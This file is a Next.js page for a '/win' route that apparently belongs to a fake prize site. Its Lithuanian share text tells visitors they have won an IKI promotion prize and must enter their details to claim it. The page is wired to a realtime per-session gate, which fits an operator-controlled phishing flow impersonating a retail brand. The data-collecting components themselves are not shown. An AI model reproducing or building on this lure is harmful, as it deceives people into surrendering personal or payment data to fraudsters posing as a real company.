import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { WinFlow } from "@/components/demo/WinFlow";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { buildShareMetadata } from "@/lib/share-metadata";

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return buildShareMetadata({
    title: "IKI — Jūs laimėjote!",
    description:
      "Sveikiname! Jūs laimėjote IKI akcijos prizą. Užpildykite duomenis ir gaukite savo prizą.",
    canonical: "/win",
  });
}

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function WinPage({ searchParams }: Props) {
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: await searchParams,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <WinFlow sessionId={sessionId} routeSessionId={routeSessionId} />
    </>
  );
}
